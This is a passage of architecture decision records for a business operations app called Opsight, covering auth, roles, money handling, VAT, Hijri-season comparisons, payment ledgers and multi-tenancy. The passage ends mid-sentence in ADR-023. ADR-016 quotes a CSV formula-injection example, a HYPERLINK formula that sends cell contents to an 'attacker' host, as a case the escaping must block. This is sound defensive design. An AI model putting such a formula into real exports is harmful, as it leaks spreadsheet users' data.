# Opsight — Architecture Decision Records

Every decision where a reasonable engineer could have chosen differently. Each records the
alternatives, the reasoning, the cost accepted, and what would make it worth revisiting.

Status: **Accepted** decisions govern Phase 01 onward and can be overturned by the project
owner. **Open** decisions need an answer before the phase that depends on them.

---

## ADR-001 — Single-business, not multi-tenant

**Status:** Superseded by ADR-023 (2026-09): the external sale this was waiting for is now
the plan.
**Affects:** Every table, every query, every test

**Decision.** Opsight serves one business per installation. There is no `businesses` table
and no tenant column.

**Alternatives.**

1. *Multi-tenant with `business_id` on every table.* Adds a column, an index and a global
   scope to nineteen tables, plus tenant-scoping middleware, cross-tenant IDOR tests on
   every endpoint, and tenant-aware seeding. That work is real and lands on every future
   feature, not just once.
2. *Database-per-tenant.* Operationally heavy — migration orchestration across N databases,
   connection switching — and wholly unjustified at this scale.
3. *Single-business.* Chosen.

**Reasoning.** The product is an internal operations system for one company's staff.
Multi-tenancy serves a business model Opsight does not have. Building it now would mean
paying for isolation that nothing uses, and every over-engineering rule in the brief points
the same way.

**Cost accepted.** Retrofitting is not free: one migration per table to add `business_id`,
a backfill to a default business, an Eloquent global scope, and a sweep of every raw
aggregate query. Estimated at several days, and it must happen before a second customer,
not after.

**Mitigation.** `business_settings` already isolates per-business configuration
(currency, timezone, fiscal year), so the concept has a home. Queries go through model
scopes rather than scattered raw SQL, which is what makes a global scope a viable retrofit.

**Revisit when:** a second business must share one deployment.

---

## ADR-002 — Sanctum SPA cookie authentication, not JavaScript-held tokens

**Status:** Accepted
**Affects:** Auth flow, deployment topology, frontend rendering model

**Decision.** Laravel Sanctum in stateful SPA mode. The frontend and API are served from
sibling subdomains of a shared parent domain; the session lives in an HttpOnly cookie.

**Alternatives.**

1. *Sanctum API tokens in `localStorage`.* Simple, no domain constraint — and readable by
   any successful XSS. A stolen bearer token is a portable, long-lived credential. Rejected.
2. *Bearer tokens proxied through Next.js route handlers (BFF).* The token lives in a
   Next-set HttpOnly cookie and never reaches browser JavaScript. Genuinely secure, removes
   the shared-domain requirement, and enables server-side data fetching. Rejected for the
   MVP because it means a second server-side hop to build, deploy, test and debug, with
   two auth mechanisms to keep in step.
3. *Sanctum SPA cookie mode.* Chosen.

**Reasoning.** Option 3 gives the same XSS resistance as option 2 with one authentication
mechanism instead of two, and it is the path Laravel documents and supports best.

**Cost accepted.**

- ~~Local development needs hosts-file entries (`app.opsight.test`, `api.opsight.test`).~~
  **Revised in Phase 01: not true.** Cookies ignore port numbers, so `localhost:8000` and
  `localhost:3000` already share a cookie domain. Local setup needs `SESSION_DOMAIN=localhost`
  and `SANCTUM_STATEFUL_DOMAINS=localhost:3000` and nothing else — no hosts file, no
  administrator rights. This removed the main practical objection to this ADR.
- Production still requires both apps under one parent domain, which constrains deployment.
- **Authenticated data is fetched client-side**, so Server Components render the shell but
  not the data (FRONTEND_ARCHITECTURE.md §2). This one held.

**Verified in Phase 01** over real HTTP, end to end: CSRF cookie issued (204), login (200)
setting an HttpOnly session cookie, `/me` authenticated by that cookie alone (200), an unsafe
request without the CSRF header rejected (419), logout (204), and `/me` afterwards (401).
Covered by automated tests at both the feature and browser level.

**Revisit when:** server-side rendering of authenticated data becomes a requirement — a
public shared report link, or a hard SEO/first-paint need. Option 2 is then the move, and
it is additive rather than a rewrite.

---

## ADR-003 — Roles in code, not in the database

**Status:** Accepted
**Affects:** Schema, authorization layer

**Decision.** Four fixed roles in a PHP enum, with a single registry mapping role to
abilities. No `roles`, `permissions` or `role_user` tables.

**Alternatives.**

1. *`spatie/laravel-permission`.* Excellent package, database-backed, runtime-editable.
   Brings three tables, cached permission loading, and an admin UI to build before anyone
   can use it.
2. *Hand-rolled `roles`/`permissions` tables.* All of the above cost, less maturity.
3. *Code registry.* Chosen.

**Reasoning.** The MVP's roles are closed and product-defined. Ability changes are product
decisions that should be code-reviewed and diffable, not database rows that change without
a trace. The registry is also the single source of truth the frontend reads via `/me`.

**Cost accepted.** Changing an ability requires a deploy. For a fixed four-role product,
that is desirable friction rather than a limitation.

**Mitigation.** Code checks `can('expenses.view')`, never `role === 'manager'`
(ROLES_AND_PERMISSIONS.md §5.7). Because every check already goes through abilities,
swapping the registry's backing store for database rows is a single-file change.

**Revisit when:** a customer needs custom roles or a per-user ability override.

---

## ADR-004 — Monorepo with `backend/` and `frontend/`

**Status:** Accepted
**Affects:** Repository layout, CI, deployment

**Decision.** One repository containing both applications and the documentation.

**Alternatives.**

1. *Two repositories.* Clean separation, independent CI and versioning — and an API contract
   change becomes two pull requests in two repositories that must merge in the right order.
   Every cross-cutting change gets that overhead.
2. *Monorepo with a JavaScript workspace tool (Turborepo, Nx).* Useful when packages are
   shared between JavaScript applications. Here there is exactly one JavaScript application
   and one PHP application; the tool would manage nothing.
3. *Plain monorepo, two independent toolchains.* Chosen.

**Reasoning.** The API contract is the highest-churn boundary in the project. Keeping both
sides in one commit means a contract change and its client update are reviewed together and
can never ship half-deployed. For a portfolio project it also means one link tells the whole
story.

**Cost accepted.** CI must path-filter so a frontend change does not run the PHP suite
(TESTING_STRATEGY.md §8). Deployment targets differ per directory. Both are handled once,
in configuration.

**Revisit when:** the two applications acquire genuinely independent release cycles and
separate teams.

---

## ADR-005 — Order-level refunds in the MVP, no refund ledger

**Status:** Superseded by ADR-022 (2026-09). The two columns remain, as running totals
beside a ledger.
**Affects:** `orders` schema, Net Revenue, Units Sold

**Decision.** `orders.refunded_amount` and `orders.refunded_at`. One refund per order, full
or partial. No `order_refunds` table.

**Alternatives.**

1. *`order_refunds` ledger with line references.* Supports multiple partial refunds,
   attributes refunds to their issue date, and enables unit-level refund accounting. Needs
   a table, a service, UI, and a decision about which period a refund belongs to.
2. *Boolean `is_refunded`.* Cannot express a partial refund at all. Rejected.
3. *Two columns on `orders`.* Chosen.

**Reasoning.** Two columns cover the common case at near-zero cost. A ledger is the correct
end state but is not what makes the MVP valuable.

**Cost accepted, stated plainly.**

- A second refund on the same order cannot be recorded without overwriting the first.
- Refunds reduce the period the order was **placed** in, so a closed period's revenue can
  move when a late refund is recorded (METRICS.md §2.2).
- Units Sold is not reduced by refunds, because there is no line-level refund data
  (METRICS.md §2.4).

**Revisit when:** multiple partial refunds, or refund-date-based reporting, is needed.

---

## ADR-006 — Single stock location

**Status:** Accepted
**Affects:** `inventory_items`, `inventory_movements`

**Decision.** One stock location. `inventory_items` has one row per product, enforced by
`UNIQUE(product_id)`.

**Alternatives.** A `locations` table with per-location stock rows and inter-location
transfer movements. That brings location selection into order confirmation, a transfer
workflow, per-location low-stock thresholds and location-aware analytics — a module, not a
column.

**Reasoning.** Out of MVP scope, and it would touch every inventory surface.

**Mitigation.** The migration is small and known: drop `UNIQUE(product_id)`, add
`location_id`, add `UNIQUE(product_id, location_id)`, add `location_id` to movements,
backfill a default location. Keeping stock in its own table rather than as columns on
`products` is what makes that migration small.

**Revisit when:** a second stock location exists.

---

## ADR-007 — Stock is checked at confirm; no backorders

**Status:** Accepted
**Affects:** Order confirmation, inventory

**Decision.** Confirming an order whose lines exceed available stock fails with 409. Stock
is checked and decremented in one locked transaction at confirm time.

**Alternatives.**

1. *Allow negative stock (backorders).* Real for businesses that sell ahead of supply, but
   it changes the meaning of "stock on hand", needs a fulfilment queue and allocation rules,
   and removes the `CHECK (stock_on_hand >= 0)` safety net.
2. *Reserve stock when a draft is created.* Requires reservation expiry, abandoned-draft
   cleanup, and a reserved-versus-available distinction throughout the UI.
3. *Check and decrement at confirm.* Chosen.

**Reasoning.** The simplest model that is always internally consistent: stock on hand means
physical stock, and it is never negative.

**Cost accepted.** Two users can both build drafts for the last unit; the second fails at
confirm. That is a visible, well-explained failure rather than a silent oversell.

**Mitigation.** `inventory_items.reserved_quantity` exists in the schema, always 0 in the
MVP, so option 2 can be added without a migration.

**Revisit when:** users regularly hit the confirm-time failure, or the business genuinely
sells ahead of stock.

---

## ADR-008 — Flat categories

**Status:** Accepted
**Affects:** `categories`, breakdown analytics

**Decision.** One level. No `parent_id`.

**Alternatives.** Adjacency list (recursive queries for rollups), nested set (fast reads,
painful writes), or materialized path. Each also requires deciding whether a parent's
revenue includes its children's — a question that changes every breakdown, chart and export.

**Reasoning.** Hierarchy multiplies the complexity of aggregation, which is the product's
core. A flat list covers small-business catalogs.

**Revisit when:** a real catalog needs grouping beyond one level. Adjacency list plus
recursive CTEs is the path; MariaDB 10.4 supports them.

---

## ADR-009 — No pre-aggregation in the MVP

**Status:** Accepted
**Affects:** Metric layer, performance

**Decision.** Every metric is computed live from L0. No `daily_metrics` rollup table.

**Alternatives.**

1. *Nightly rollup table.* Fast dashboards, at the cost of staleness, a rebuild job,
   dirty-day invalidation for backdated entries, and a second place where a metric is
   defined — which is the real danger.
2. *Materialized views.* Not available in MySQL or MariaDB.
3. *Live computation with good indexes.* Chosen.

**Reasoning.** At realistic small-business volume — tens of thousands of orders — indexed
aggregation is fast. Pre-aggregating before measuring is optimising a problem that may not
exist, and it risks the correctness the whole product rests on.

**Trigger to implement.** Dashboard p95 above 500 ms on the seeded dataset. That dataset
exists specifically so this is a measurement, not a guess.

---

### MEASURED IN PHASE 04 — verdict: NOT WARRANTED

Dataset: 2,277 orders, 5,520 line items, 6,352 stock movements, 36 months.

The naive measurement said the trigger was met, and it was wrong. Measuring the endpoints
over HTTP gave a dashboard p95 of 774 ms — comfortably past 500 ms, and an apparently clear
mandate to build the rollup table.

Two further measurements showed that conclusion was an artefact:

| What was measured | Result |
| --- | --- |
| Dashboard summary, called directly (no HTTP, no framework boot) | **86 ms**, 16 queries |
| `GET /health` over HTTP — no auth, no database, no work at all | **561 ms** |
| `GET /dashboard` over HTTP | 664 ms |
| **Attributable to the analytics work** | **~103 ms** |

`php artisan serve` is a single-threaded PHP dev server with no opcache. Its fixed
per-request cost on this machine is roughly 560 ms, and that is what the first measurement
was mostly recording. The confirmation: after a change that provably cut the summary from
52 queries to 16, the HTTP figures got *worse* — noise, not signal.

**So the rollup table is not built.** It would introduce staleness, a rebuild job,
dirty-day invalidation for backdated entries, and a second place where a metric is defined,
in order to fix roughly 100 ms that is already well inside budget.

**What the measurement did find** was a real problem the rollup would have masked: the
metric methods derived from each other — `netMargin → netProfit → grossProfit → netRevenue`,
and `grossMargin → netRevenue` again — so `netRevenue` was queried six times per period and
a single summary issued **52 queries**. Consolidating the order-level totals into one
memoised aggregate per period cut that to 16, and the three-year summary from 181 ms to
80 ms. That fix costs no staleness and creates no second definition.

**Caveat, stated plainly.** 561 ms of the measurement is the dev server, so the absolute
HTTP numbers here say nothing about production. What they do establish is the *shape*: the
application's own cost is ~100 ms at this data volume, and the trigger is not met. The
figure should be re-measured on php-fpm with opcache before deployment, and again at ten
times the data.

**Binding constraints if adopted.** A rollup is a **cache, not a record**: fully
reconstructible from L0 by one command; a test asserting rebuilt values equal live-computed
values; backdated writes mark affected days dirty. The metric definition stays in one place.

---

## ADR-010 — Rule-based insights, no anomaly detection

**Status:** Accepted
**Affects:** L3 insights

**Decision.** Insights are explicit threshold rules (METRICS.md §4). No statistics, no
models.

**Alternatives.** Z-score or IQR outlier detection on daily series; seasonal decomposition;
forecasting. All need enough history to be meaningful, all produce false positives on small
retail data, and none can explain themselves in a sentence a manager will act on.

**Reasoning.** Deterministic rules are testable, explainable and trustworthy. "Margin fell
4.2 pp because COGS rose 18%" is more useful than "anomaly detected, confidence 0.83".

**Revisit when:** there are two or more years of dense history and users ask for
detection rather than thresholds.

---

## ADR-011 — Database queue driver, no Redis

**Status:** Accepted
**Affects:** Queues, caching, rate limiting, deployment

**Decision.** `database` for queues and cache in the MVP.

**Reasoning.** The MVP has no queued jobs — exports are synchronous and row-capped. Adding
Redis now means a service to run, configure, secure and monitor for a feature that does not
exist. Laravel's driver abstraction makes the switch a configuration change.

**Revisit when:** the first real background job ships, or the cache becomes hot enough for
database contention to show. Redis then also improves rate limiting across multiple
application instances.

---

## ADR-012 — No client-side schema validation library

**Status:** Accepted
**Affects:** Frontend forms

**Decision.** `react-hook-form` for form state; the server's 422 response is the source of
validation truth. No Zod, Yup or Joi.

**Reasoning.** A client schema duplicates rules that already exist as Laravel FormRequests,
and the two drift. Worse, the client copy is the one that looks authoritative to whoever is
writing the form. One definition, on the server, with the client rendering its errors.

Zod is additionally TypeScript-first; its main advantage — inferred static types — is
unavailable in a JavaScript-only project, so the cost/benefit is worse here than usual.

**Cost accepted.** A round trip for full validation feedback. Mitigated by inline
required/format checks for immediate response, and by the API being local-fast.

**Revisit when:** a form is complex enough that round-trip latency genuinely harms the
experience — a multi-step wizard, for instance.

---

## ADR-013 — Shipping and tax excluded from revenue

**Status:** Accepted
**Affects:** Net Revenue, Gross Margin, every profit metric

**Decision.** Net Revenue excludes both `tax_amount` and `shipping_amount`.

**Reasoning.**

- **Tax** is collected for a tax authority. It is a liability, not earnings. Including it
  inflates revenue and destroys margin comparability. This is not debatable.
- **Shipping** is genuinely debatable. A business charging shipping at cost is recovering an
  expense; a business charging a margin on shipping is earning revenue. Opsight treats it as
  cost recovery, because the alternative inflates revenue for every business that does not
  profit on delivery, and because shipping cost is not modelled — counting the income
  without the cost would overstate profit.

**Cost accepted.** Businesses that profit on shipping will see revenue understated.

**Mitigation.** `shipping_amount` is stored on every order, so the definition can change
without data loss. The change is one line in the Net Revenue metric plus its tests.

**Revisit when:** shipping cost is modelled, or a user reports the understatement.

---

## ADR-014 — Inventory Turnover deferred; Stock Coverage instead

**Status:** Accepted
**Affects:** Inventory metrics

**Decision.** Inventory Turnover is not in the MVP. Stock Coverage in days ships instead
(METRICS.md §2.19).

**Reasoning.** Turnover needs average inventory *value* over the period, which needs
historical stock valuation, which needs a costing method (FIFO or weighted average) the MVP
has not chosen. Approximating with current inventory value produces a number that is wrong
whenever stock levels moved — which is always — and looks perfectly plausible while being
wrong. That is the exact failure mode this project is designed to avoid.

**Mitigation.** `inventory_movements.unit_cost` is recorded on restocks, so the cost basis
for a future valuation is already being captured.

**Revisit when:** a costing method is chosen and daily valuation snapshots exist.

---

## ADR-015 — `DECIMAL` for money, not integer minor units

**Status:** Accepted
**Affects:** Every money column, every aggregate

**Decision.** `DECIMAL(15,4)` for unit amounts, `DECIMAL(15,3)` for totals, rounded to the
currency's own decimal places. Money crosses the API as a string, at those places.

> **Amended 2026-09.** Totals were `DECIMAL(15,2)` and every calculation used two places,
> while `currency_decimals` reached only the display. That silently dropped the third decimal
> of BHD — the product's default — and of KWD, OMR and JOD. Totals are now `DECIMAL(15,3)`,
> enough for any accepted currency (0–3 places). Every rounding, sum and comparison takes its
> scale from `App\Support\Money::scale()`, and `App\Casts\CurrencyAmount` replaces the
> fixed `decimal:2` cast. `tests/Feature/Orders/CurrencyPrecisionTest.php` fails if any of
> this regresses.

**Alternatives.**

1. *`BIGINT` minor units (cents).* Immune to decimal representation issues and the common
   choice in payment systems. But every aggregate needs conversion on the way out, unit
   costs below one cent need a scale factor anyway, and raw SQL aggregates become harder to
   read and verify by hand — which matters for a system whose correctness is checked against
   hand calculations.
2. *`FLOAT`/`DOUBLE`.* Never. Not a real alternative.
3. *`DECIMAL`.* Chosen.

**Reasoning.** `DECIMAL` is exact in MySQL and MariaDB, `SUM()` and `AVG()` stay exact, and
values are readable in the database during verification. Opsight's primary operation is
aggregation, so keeping aggregation exact and legible in SQL is worth more than integer
arithmetic's safety in application code.

**Cost accepted.** PHP and JavaScript must not cast these to floats. Controlled by: the
`CurrencyAmount` cast and `decimal:4` for unit amounts, money serialised as strings, `Intl.NumberFormat` for display, no
arithmetic on money in JavaScript, and a unit test for the whole path.

---

## ADR-016 — CSV formula escaping exempts well-formed numbers

**Status:** Accepted
**Affects:** Every export. Narrows SECURITY.md §9.6.

**Decision.** A CSV cell beginning `=`, `+`, `-`, `@`, tab or carriage return is prefixed with
an apostrophe, **unless the cell is a well-formed number**.

**The problem.** SECURITY.md §9.6, written in Phase 00, says to escape any cell beginning with
one of those characters. Applied literally in Phase 05, that escapes `-1450.00` — and every
refund, every loss, every downward stock adjustment in a financial export arrives in the
spreadsheet as TEXT. The column will not sum.

**Alternatives.**

1. *Escape everything, as written.* Faithful to the document and produces an export that does
   not do the one thing an export exists for. The predictable outcome is not that users accept
   it: it is that someone removes the escaping wholesale the first time a finance team
   complains, and then nothing is escaped.
2. *Escape only `=` and `@`.* Smaller rule, but `+1+1` and `-1+1` are both evaluated by Excel,
   so it leaves a real hole.
3. *Escape unless the cell parses as a number.* Chosen.

**Reasoning.** The security property is that no exported cell can execute as a formula. A
string that parses as a number cannot also be a formula, so exempting numbers removes nothing
from the guarantee — it is narrower in wording and identical in effect. `-1450.00` is a
number; `-1+1`, `-A1` and `-HYPERLINK("http://attacker/?d="&A1,"x")` are not, and all three
are still escaped.

**Cost accepted.** The rule now has a second clause, which is a place to be wrong. Controlled
by putting it in ONE tested predicate — `CsvCell::isNumeric`, a single explicit pattern rather
than `is_numeric`, whose acceptance of hexadecimal and leading whitespace would be exactly the
kind of edge case that turns an exemption into a hole. The test suite asserts both halves: the
formulas above are escaped, and negative money is not.

**Revisit if** an export ever needs to carry a value that is numeric to a spreadsheet but not
to this pattern — a locale using a comma as the decimal separator, for instance. The fix then
is to widen the pattern deliberately, not to drop the check.

---

## ADR-017 — In-house translation, no i18n library

**Status:** Accepted
**Affects:** Every screen, every server-written sentence. Supersedes the "localization library"
line of ROADMAP Phase 07.

**Decision.** English and Arabic are served by a translation engine of about a hundred lines
(`frontend/lib/i18n/translate.js`) over two plain dictionaries (`messages/en.js`,
`messages/ar.js`), and by Laravel's own `lang/` files on the server. No `next-intl`,
`react-i18next` or ICU message parser.

**The problem.** The product speaks exactly two languages, both known now. What a library adds
over a lookup table is plural selection, number formatting, routing by locale and message
extraction tooling. The first two are already in the platform — `Intl.PluralRules` knows Arabic
has six plural categories, and `Intl.NumberFormat` with `-u-nu-arab` writes Arabic-Indic
digits. Locale routing (`/ar/dashboard`) is wrong for this product: the language is a
preference of the signed-in person, saved on their account, not a property of a URL a
colleague might share.

**Alternatives.**

1. *next-intl.* A good library, but built around locale segments in the route; adopting it
   means restructuring `app/` for a behaviour the product does not want, and adding a
   dependency the project rule says must earn its place.
2. *react-i18next.* Heavier, and its ICU support is a second plugin.
3. *Plain dictionaries and `Intl`.* Chosen.

**Reasoning.** The genuinely hard parts are handled by the platform. What remains — nested
lookup, `{placeholder}` interpolation, choosing a plural form, emphasis tags — is small, fully
unit-tested, and has no behaviour a reader cannot see in one file.

**How it holds together.**

- The preference (`locale`, `numerals`) lives on `users`, is changed through
  `PATCH /me/preferences`, and the server answers in it (`SetLocale` middleware), so validation
  messages, insights and CSV headers match the screen.
- A cookie remembers the last choice so the server renders `<html lang dir>` correctly on the
  first byte — no left-to-right flash before the session is known.
- `tests/i18n.test.js` fails if Arabic lacks a key, uses a different placeholder, keeps an
  English sentence or writes a literal digit, or if source code asks for a key that does not
  exist. `TranslationParityTest` does the same for the server's `lang/` files.

**Cost accepted.** No extraction tooling: a new string is added to both dictionaries by hand,
and the parity test is what makes forgetting it impossible to ship.

**Revisit if** the product adds a third language, needs translator tooling, or needs
locale-addressable URLs for public pages. The dictionaries are plain objects and convert to
JSON losslessly.

---

## ADR-018 — Value-added tax: amounts stored excluding VAT, VAT snapshotted per line

**Status:** Accepted (2026-09)
**Affects:** `business_settings`, `products`, `order_items`, `orders`, `customers`,
`ConfirmOrder`, `RecordRefund`, `GET /analytics/vat`

**Context.** Until this change, tax was one number typed onto an order. No rate, nothing
per line, no VAT number anywhere. A Gulf business charging VAT (Saudi Arabia 15%, Bahrain
10%, UAE and Oman 5%) had no way to know how much of what it took belonged to the tax
authority, and had to trust whatever figure someone typed.

**Decision.**

1. **Every stored amount is EXCLUDING VAT.** Line totals, the subtotal and the order
   discount are all net of VAT, whichever way prices are written. VAT lives in its own
   columns: per line `vat_rate`, `vat_taxable_amount` and `vat_amount`, and per order
   `tax_amount` as their sum. Net Revenue has always excluded tax (ADR-013), so **no metric
   changed**. Revenue, profit, margin, AOV and the breakdowns are correct by construction.
2. **VAT is calculated at confirm and snapshotted**, like price and cost
   (`App\Domain\Tax\VatCalculation`). A rate change tomorrow cannot restate an order
   confirmed today.
3. **Prices may include or exclude VAT** (`prices_include_vat`, default: include, the
   Gulf norm). Inclusive shelf prices are converted at confirm, and the customer still pays
   exactly the shelf price.
4. **Rates.** A business rate, plus an optional per-product rate: NULL follows the
   business, 0 is zero-rated or exempt.
5. **An order-level discount reduces the VAT base.** It is shared across lines in
   proportion to their shelf amounts, with the rounding remainder on the largest line, so
   the shares sum exactly. A share never exceeds its line, so VAT can never go negative.
6. **A refund is split.** The customer's refund is divided in the order's own proportion
   of tax to total: the revenue part goes to `refunded_amount` (which Net Revenue
   subtracts), and the tax part to `refunded_vat_amount` (which it does not).
7. **Off by default.** With VAT off, confirm behaves exactly as before, including a
   typed-in tax figure. The existing test suite passes unchanged with VAT off.
8. **The report is operational, not a return.** `GET /analytics/vat` gives output VAT by
   rate, VAT refunded, and VAT due for a period, from the snapshots. Opsight records no
   purchase VAT, so there is no input VAT to reclaim. The screen says so.

**Not decided here, deliberately.**
- E-invoicing (ZATCA and others) is left to an accredited provider. Opsight will hand it
  confirmed orders (MARKET_STUDY.md §4.3).
- VAT on shipping is not calculated. Shipping is outside revenue already, and the order
  form has no shipping input yet.

**Identity the tests hold.** subtotal − net discount + VAT = the shelf total less the
discount when prices include VAT, or that plus VAT when they exclude it
(`tests/Unit/Tax/VatCalculationTest.php`). End to end:
`tests/Feature/Orders/ValueAddedTaxTest.php`.

## ADR-019 — Compare by Hijri season, and say when a comparison crosses one

**Status:** Accepted (2026-09)
**Affects:** `Comparison`, `Period::comparison()`, analytics `meta`, the period selectors, the
dashboard and analytics screens

**Context.** Ramadan and the two Eids reshape trade across the region, and they move about
eleven days earlier every Gregorian year. The one year-on-year comparison Opsight had,
`previous_year`, therefore set Ramadan against ordinary trade in most years. The insights
built on it reported a collapse or a surge that was only the calendar.

**Decision.**

1. **A fourth comparison basis, `previous_hijri_year`.** The same Hijri dates one Hijri
   year earlier, under Umm al-Qura, the official calendar of Saudi Arabia. It flows through
   every metric, time series, breakdown and insight, because they all resolve comparisons
   through `Period::comparison()`.
2. **ICU, not a library.** PHP's intl extension already ships Umm al-Qura
   (`islamic-umalqura`) (`App\Domain\Calendar\HijriCalendar`). The code refuses to run
   if ICU hands back a Gregorian calendar instead, which it would otherwise do silently.
   Tests pin Ramadan and both Eids for 1445–1447 to their public dates.
3. **The server owns the calendar.** The browser does not reimplement Hijri arithmetic. It
   shows the comparison range the server reports, so there is one implementation, and two
   cannot disagree.
4. **Awareness, not just an option.** The server flags `season_mismatch` when the period
   and its comparison differ by three days or more in any season. The screen explains the
   mismatch and offers the Hijri comparison in one click. Nobody has to know the option
   exists to benefit from it.

**Accepted limitation.** Umm al-Qura is a calculated calendar. Where a country starts
Ramadan or Eid by local moon sighting, the observed first day can differ by one day. For
comparing weeks and months of trade, one day does not change a conclusion, and the
three-day threshold absorbs it.

**Not done here.** Hijri dates are not shown beside Gregorian ones on screen. `Intl` can
render them (`-u-ca-islamic-umalqura`), and it is a presentation choice to make separately.

## ADR-020 — The business week: a configurable start, and a Gulf weekend

**Status:** Accepted (2026-09)
**Affects:** `business_settings`, `TimeSeries` weekly buckets, the daily charts, the settings
screen, the demo data

**Context.** Weekly buckets always started on Monday, hard-coded in both the PHP bucket keys
and the SQL `WEEKDAY()` grouping, and nothing knew the business's days off. Across most of
the Gulf the week starts on Sunday or Saturday, and Friday and Saturday are the weekend. A
quiet Friday on a daily chart read as a drop, and the demo data put its quiet days on
Saturday and Sunday.

**Decision.**

1. **`week_starts_on`** (ISO 1–7). Every weekly bucket begins on it: the PHP keys through
   Carbon, and the SQL through `MOD(WEEKDAY(x) − (start − 1) + 7, 7)`. Both read the same
   setting, so they cannot disagree. That disagreement is the class of bug that once zeroed
   every weekly figure under Arabic. It **defaults to Monday**, so no existing weekly figure
   moves until an Owner chooses. It is listed in `affects_history`, so the settings screen
   warns before a change that moves past weeks.
2. **`weekend_days`** (ISO days, default Friday and Saturday). They change no figure. They
   shade the daily charts, so a day off reads as a day off, and the demo data places its
   quiet days on them.
3. **Shading has width.** On a chart drawn as connected points, a band from a day to itself
   draws nothing. Consecutive days off become one band, and a lone day is widened to its
   neighbour (`weekendRuns`). The same bug had kept the "incomplete period" band invisible
   since it was written, and it is fixed the same way.

## ADR-021 — Names in Arabic beside the name as entered; phones in E.164

**Status:** Accepted (2026-09)
**Affects:** `products`, `categories`, `customers`, `order_items`, their resources, the
analytics breakdowns, customer validation

**Context.** Every name was a single field. A Gulf business commonly names its products and
customers in both languages, because its staff and its customers read different ones. A
phone number was free text, so the same customer's number never matched itself, and
nothing downstream (a WhatsApp message, a duplicate check) could use it.

**Decision.**

1. **`name` stays canonical** — whatever language it was typed in — and **`name_ar` is
   optional**, on products, categories and customers. Nothing existing changes, and an edit
   round-trip through the API cannot overwrite one name with the other.
2. **The server decides what the reader sees** (`App\Support\Localization\LocalizedName`).
   An Arabic reader gets `name_ar` when there is one, and `name` otherwise. Resources send
   `display_name`. The breakdowns, top-selling products and low-stock lists select the same
   choice in SQL, so a product cannot be called one thing in a table and another in the
   chart beside it.
3. **The Arabic name is snapshotted** at confirm, beside `product_name`. Renaming a product
   later does not rewrite what an old order sold.
4. **Phones are stored in E.164** (`App\Support\PhoneNumber`), normalised on the way in:
   punctuation dropped, `00` read as `+`, a local number given the customer's country code
   with its trunk zero removed. A number that cannot be placed is refused, with a message in
   the reader's language, and never stored as typed.

**Not done here.** The frontend has no product or customer edit form yet, so Arabic names and
phones are entered through the API until those screens exist.

## ADR-022 — Payments and refunds as ledgers; payment status derived

**Status:** Accepted (2026-09)
**Affects:** `orders`, new `order_payments` and `order_refunds`, `RecordRefund`,
`OrderResource`, the order list, the dashboard's quick stats, the roles matrix

**Context.** Opsight knew what an order was worth but not whether it had been paid. In the
Gulf a large share of online orders are cash on delivery, collected days after the goods
leave, and an owner's first question after "what did we sell" is "what are we still owed".
Refunds were one pair of columns (ADR-005), so a second refund overwrote the first.

**Decision.**

1. **A payments ledger.** `order_payments` has one row per payment: amount, method (cash,
   card, bank transfer, cash on delivery, wallet, other), when, an optional reference.
   Split payments and late cash-on-delivery collection are rows, not edits. A payment is
   accepted only on a committed order (confirmed, fulfilled or refunded) and never beyond
   what is outstanding. An overpayment is a conversation with the customer, not a figure.
2. **A refunds ledger.** `order_refunds` has one row per refund, split into revenue and VAT
   (ADR-018), with an optional reason. An order can be refunded in parts until nothing is
   left to return. The first refund moves a fulfilled order to `refunded`, and later refunds
   add to it.
3. **Running totals stay on the order.** `amount_paid`, `refunded_amount` and
   `refunded_vat_amount` move in the same locked transaction as each ledger row. Every
   metric already reads the order, so none changed. Tests hold each total to the sum of its
   ledger.
4. **Payment status is derived, never stored.** outstanding = max(0, total − refunded −
   paid). A refund counts against what is owed: goods returned before payment mean less to
   collect. Only a committed order has a status: *unpaid*, *partially paid* or *settled*.
   The list filters on the same formula in SQL (`PaymentStatus::outstandingSql`).
5. **Stock goes back once per order.** Without line-level refund data, "return stock" means
   every line's full quantity. `stock_returned_at` stops a second refund from shelving the
   same goods twice. The endpoint defaults `return_stock` to off once stock is back.
6. **Recording a payment is front-line work.** `orders.record_payment` is granted to Staff
   as well as Owner and Manager: the cashier and the delivery driver take the money. Money
   going back out stays supervisory, under `orders.refund`.
7. **Receivables are a quick stat** for roles with `analytics.view`: what committed orders
   owe today. Like inventory value, it is a position with no history, so no change is shown.

**Backfill.** Orders fulfilled or refunded before this change are taken as paid in full: one
payment, method "other", marked `is_backfill`, shown as "recorded before payment tracking".
Without it every historical sale would read as unpaid and receivables would be inflated by
money that was, in fact, collected. Confirmed orders not yet fulfilled start unpaid. Existing
refunds become the first row of the new ledger, with their stock taken as returned.

**Cost accepted.**

- A refund still reduces the revenue of the period the order was **placed** in (METRICS.md
  §2.2). The ledger records each refund's own date, so refund-date reporting is now
  possible, but it is not built.
- Units Sold is still not reduced by refunds: a refund has an amount, not lines.
- A mistaken payment cannot be edited or deleted; the ledger is append-only. Correcting one
  needs a reversal entry, which is not built.

**Revisit when:** line-level returns are needed, or a payment gateway starts reporting
payments on its own (they would be written through `RecordPayment`, not beside it).

## ADR-023 — Many businesses in one database, isolated by `business_id`

**Status:** Accepted (2026-09), superseding ADR-001
**Affects:** every business-owned table, the models, authentication, audit, tests

**Context.** Selling Opsight to more than one company needs one deployment to serve many
businesses, with no way for one to see another's data. It is the first item of P2 in the
market study, and the integrations after it (Salla, WhatsApp) must be built per business
from the start.

**Decision.**

1. **One database, a `business_id` column.** Database-per-business would give stronger
   isolation, but it means running migrations across N databases and switching
   connections. That is unjustified at this scale.
2. **Every owned table carries the column, NOT NULL with a foreign key.** That includes the
   children of an order (`order_items`, payments, refunds). The metric queries read those
   tables directly, and a filter that needs a join to apply is one that a query will
   eventually forget.
3. **Uniqueness becomes per business:** SKU, customer email, order reference, category slug,
   and expense category name and slug. A user's email stays globally unique, because
   sign-in is by email and must name exactly one account.
4. **The business comes from the signed-in user.** It is set by the `Authenticated` event,
   when the guard resolves the user from the session. That happens before route model
   binding, so `{order}` is looked up inside the right business from the start.
   `CurrentBusiness` is a scoped instance, so a worker starts every request and job with no
   business.
5. **Reads are scoped by a global scope (`ScopedToBusiness`), and it fails closed.** A query
   on owned data with no business in context throws `MissingBusinessContext`. It never
   returns an empty list, and never every business's rows. Another business's record is a
   404, not a 403 that would confirm it exists.
6. **Users carry the column but not the scope.** The guard must find a user by email before
   any business is known. User management is scoped explicitly.
7. **The audit log may hold a row with no business.** A failed sign-in for an address that
   matches no account belongs to nobody. An attack on a real account is filed under that
   account's business, where its owner can see it.
8. **Settings are one row per business.** `CHECK (id = 1)` becomes UNIQUE(business_id), and
